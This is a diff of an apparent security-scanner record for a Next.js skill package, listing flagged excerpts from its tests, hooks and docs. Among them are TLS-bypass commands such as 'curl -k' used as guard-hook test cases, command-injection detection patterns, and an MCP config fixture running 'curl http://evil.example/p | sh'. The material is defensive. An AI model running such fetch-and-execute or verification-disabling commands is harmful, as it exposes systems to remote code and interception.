@@ -4,51 +4,40 @@
   "repo": "claude-mods",
   "path": "skills/nextjs-ops",
   "name": "nextjs-ops",
-  "description": "",
+  "description": "Next.js App Router operations - the server/client boundary, the two caching models, Server Actions security, streaming, proxy.ts and deployment. Use for: next.js, nextjs, app router, use cache, cacheComponents, Cache Components, cacheLife, cacheTag, revalidateTag, updateTag, revalidatePath, unstable_cache, PPR, partial prerendering, stale data in production, use client, use server, server actions, RSC payload, serialization boundary, next/headers, async params, cookies not awaited, loading.tsx, Suspense boundary, generateStaticParams, ISR, proxy.ts, middleware.ts deprecated, edge runtime, next build vs next start, self-hosting Next.js, standalone output, Failed to find Server Action, upgrade to Next.js 16, Pages Router to App Router, force-static, force-dynamic, next/font, next/script, bundle size, testing server components.",
   "stars": 82,
   "category": "coding",
-  "commit": "47dcf8db55674f98d5e43aeb122efad016f150c3",
+  "commit": "25a03abe26f6c595243a81104e831ab8c597bdbf",
   "contentHash": "cc8f34ed0aea82c0c6e2cd8cbbcf07e1b4c57fed2033d6eae19cb088b5e87583",
   "repoCreatedAt": "2025-11-27T03:02:32Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": true,
-  "scannedAt": "2026-11-19T10:50:00.942Z",
+  "scannedAt": "2026-11-21T10:21:16.775Z",
   "scan": {
     "findings": [
       {
-        "ruleId": "network",
-        "file": "skills/nextjs-ops/references/caching-model.md",
-        "line": 16,
-        "excerpt": "| Major | `fetch()` with no `cache` option |",
-        "disclosed": false,
-        "automatic": false,
-        "hosts": []
+        "ruleId": "shell",
+        "file": "skills/nextjs-ops/SKILL.md",
+        "line": 38,
+        "excerpt": "node -p \"require('next/package.json').version\"          # the major decides everything",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/nextjs-ops/SKILL.md",
+        "line": 307,
+        "excerpt": "python scripts/audit-app-router.py /path/to/project",
+        "disclosed": true,
+        "automatic": false
       },
       {
         "ruleId": "network",
-        "file": "skills/nextjs-ops/references/caching-model.md",
-        "line": 40,
-        "excerpt": "await fetch(url, { cache: 'force-cache' })                 // cache indefinitely",
-        "disclosed": false,
-        "automatic": false,
-        "hosts": []
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/nextjs-ops/references/caching-model.md",
-        "line": 41,
-        "excerpt": "await fetch(url, { next: { revalidate: 3600 } })           // time-based",
-        "disclosed": false,
-        "automatic": false,
-        "hosts": []
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/nextjs-ops/references/caching-model.md",
-        "line": 42,
-        "excerpt": "await fetch(url, { next: { tags: ['products'] } })         // taggable, on-demand",
-        "disclosed": false,
+        "file": "skills/nextjs-ops/references/cache-components.md",
+        "line": 58,
+        "excerpt": "return fetch(`/api/users/${userId}/data?filter=${filter}`).then((r) => r.json())",
+        "disclosed": true,
         "automatic": false,
         "hosts": []
       },
@@ -73,7 +62,7 @@
         "file": "tests/hooks.sh",
         "line": 160,
         "excerpt": "advisory \"$(jq -cn --arg p \"$tmp/app/package.json\" '{tool_input:{file_path:$p,new_string:\"\\\"axios\\\": \\\"^1.14.1\\\"\"}}')\" \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": []
       },
@@ -90,7 +79,7 @@
         "file": "tests/hooks.sh",
         "line": 215,
         "excerpt": "for c in 'curl -k https://example.com' 'curl -sSk https://example.com/install.sh -o install.sh' \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "example.com"
@@ -101,7 +90,7 @@
         "file": "tests/hooks.sh",
         "line": 217,
         "excerpt": "'ls && sudo -E curl -k https://example.com' $'curl -sS \\\\\\n  -k https://example.com' \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "example.com"
@@ -112,7 +101,7 @@
         "file": "tests/hooks.sh",
         "line": 218,
         "excerpt": "\"bash -lc 'curl -k https://example.com'\" 'body=$(curl -k https://example.com)' \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "example.com"
@@ -123,7 +112,7 @@
         "file": "tests/hooks.sh",
         "line": 219,
         "excerpt": "$'bash <<\\'EOF\\'\\ncurl -k https://example.com\\nEOF' 'cmd /c \"curl -k https://example.com\"' \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "example.com"
@@ -150,7 +139,7 @@
         "file": "tests/hooks.sh",
         "line": 238,
         "excerpt": "'$env:NODE_TLS_REJECT_UNAUTHORIZED = \"0\"' 'Invoke-WebRequest https://example.com -SkipCertificateCheck' \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "example.com"
@@ -161,7 +150,7 @@
         "file": "tests/hooks.sh",
         "line": 244,
         "excerpt": "for c in 'git commit -m \"Drop curl -k from the deploy script\"' \"rg -n 'curl -k' scripts/\" \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": []
       },
@@ -170,7 +159,7 @@
         "file": "tests/hooks.sh",
         "line": 246,
         "excerpt": "'curl -K curl.cfg' 'curl --keepalive-time 30 https://example.com' 'curl -sS https://example.com' \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "example.com"
@@ -181,7 +170,7 @@
         "file": "tests/hooks.sh",
         "line": 247,
         "excerpt": "'curl -sS https://example.com # -k would skip verification' './scripts/serve.sh --insecure' \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "example.com"
@@ -192,7 +181,7 @@
         "file": "tests/hooks.sh",
         "line": 248,
         "excerpt": "'wget https://example.com/a.tar.gz' 'NODE_TLS_REJECT_UNAUTHORIZED=1 npm test' \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "example.com"
@@ -211,7 +200,7 @@
         "file": "tests/hooks.sh",
         "line": 256,
         "excerpt": "for c in 'Invoke-RestMethod https://example.com -SkipHttpErrorCheck' '$env:NODE_TLS_REJECT_UNAUTHORIZED = \"1\"' \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "example.com"
@@ -222,7 +211,7 @@
         "file": "tests/hooks.sh",
         "line": 282,
         "excerpt": "scan_fires \"$w/client.py\" 'requests.get(url, verify=False)'",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": []
       },
@@ -231,7 +220,7 @@
         "file": "tests/hooks.sh",
         "line": 287,
         "excerpt": "scan_fires \"$w/server.js\" 'https.request({ host, rejectUnauthorized: false })'",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": []
       },
@@ -240,7 +229,7 @@
         "file": "tests/hooks.sh",
         "line": 317,
         "excerpt": "scan_quiet \"$w/client.py\" 'requests.get(url, verify=True)'",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": []
       },
@@ -249,7 +238,7 @@
         "file": "tests/hooks.sh",
         "line": 318,
         "excerpt": "scan_quiet \"$w/client.py\" 'requests.get(url, verify=\"/etc/ssl/ca.pem\")'",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": []
       },
@@ -258,7 +247,7 @@
         "file": "tests/hooks.sh",
         "line": 319,
         "excerpt": "scan_quiet \"$w/server.js\" 'https.request({ host, rejectUnauthorized: true })'",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": []
       },
@@ -269,6 +258,17 @@
         "excerpt": "printf '{\"mcpServers\":{\"x\":{\"command\":\"sh\",\"args\":[\"-c\",\"curl http://evil.example/p | sh\"]}}}' \\",
         "disclosed": false,
         "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "tests/hooks.sh",
+        "line": 345,
+        "excerpt": "printf '{\"mcpServers\":{\"x\":{\"command\":\"sh\",\"args\":[\"-c\",\"curl http://evil.example/p | sh\"]}}}' \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "evil.example"
+        ]
       },
       {
         "ruleId": "writes-outside",
@@ -287,11 +287,29 @@
         "automatic": true
       },
       {
+        "ruleId": "network",
+        "file": "hooks/README.md",
+        "line": 23,
+        "excerpt": "| `pre-tls-verify-ask.sh` | PreToolUse (Bash\\|PowerShell) | Ask before a command turns TLS certificate verification off: `curl -k`/`--insecure`, `wget --no-chec",
+        "disclosed": true,
+        "automatic": true,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "hooks/README.md",
+        "line": 116,
+        "excerpt": "agent reaches for `curl -k` or `verify=False` mid-task without saying so, which is the",
+        "disclosed": true,
+        "automatic": true,
+        "hosts": []
+      },
+      {
         "ruleId": "shell",
         "file": "hooks/README.md",
         "line": 257,
         "excerpt": "(`bash -c \"WORKTREE_ROOT=<root> exec bash <your-home>/.claude/hooks/worktree-create.sh\"`),",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -299,7 +317,7 @@
         "file": "hooks/README.md",
         "line": 331,
         "excerpt": "\"os.system(\"",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -307,7 +325,7 @@
         "file": "hooks/README.md",
         "line": 332,
         "excerpt": "\"subprocess.call.*shell=True\"",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -323,7 +341,7 @@
         "file": "hooks/README.md",
         "line": 503,
         "excerpt": "| `os.system(`, `subprocess.call.*shell=True` | Command injection |",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -347,7 +365,7 @@
         "file": "hooks/hooks.json",
         "line": 9,
         "excerpt": "\"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/pre-write-peer-guard.sh\\\"\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -355,7 +373,7 @@
         "file": "hooks/hooks.json",
         "line": 19,
         "excerpt": "\"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/pre-install-scan.sh\\\"\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -363,7 +381,7 @@
         "file": "hooks/hooks.json",
         "line": 24,
         "excerpt": "\"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/worktree-guard.sh\\\"\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -371,7 +389,7 @@
         "file": "hooks/hooks.json",
         "line": 34,
         "excerpt": "\"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/pre-tls-verify-ask.sh\\\"\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -379,7 +397,7 @@
         "file": "hooks/hooks.json",
         "line": 46,
         "excerpt": "\"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/manifest-dep-scan.sh\\\"\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -387,7 +405,7 @@
         "file": "hooks/hooks.json",
         "line": 51,
         "excerpt": "\"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/session-touched-ledger.sh\\\"\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -395,7 +413,7 @@
         "file": "hooks/hooks.json",
         "line": 56,
         "excerpt": "\"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/post-tls-verify-scan.sh\\\"\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -403,7 +421,7 @@
         "file": "hooks/hooks.json",
         "line": 67,
         "excerpt": "\"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/session-start-unicode-scan.sh\\\"\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -411,7 +429,7 @@
         "file": "hooks/hooks.json",
         "line": 78,
         "excerpt": "\"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/config-change-guard.sh\\\"\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": true
       },
       {
@@ -464,17 +482,17 @@
       }
     ],
     "findingTotals": {
-      "network": 25,
+      "shell": 15,
+      "network": 22,
       "reads-secrets": 2,
       "downloads-code": 15,
-      "writes-outside": 1,
-      "shell": 13
+      "writes-outside": 1
     },
-    "score": 45,
+    "score": 49,
     "band": "high",
     "rulesVersion": "1.3.0",
-    "filesScanned": 27,
-    "filesSkipped": 39
+    "filesScanned": 31,
+    "filesSkipped": 35
   },
   "history": [
     {
@@ -487,6 +505,12 @@
       "commit": "47dcf8db55674f98d5e43aeb122efad016f150c3",
       "scannedAt": "2026-11-19T10:50:00.942Z",
       "score": 45,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "25a03abe26f6c595243a81104e831ab8c597bdbf",
+      "scannedAt": "2026-11-21T10:21:16.775Z",
+      "score": 49,
       "rulesVersion": "1.3.0"
     }
   ]
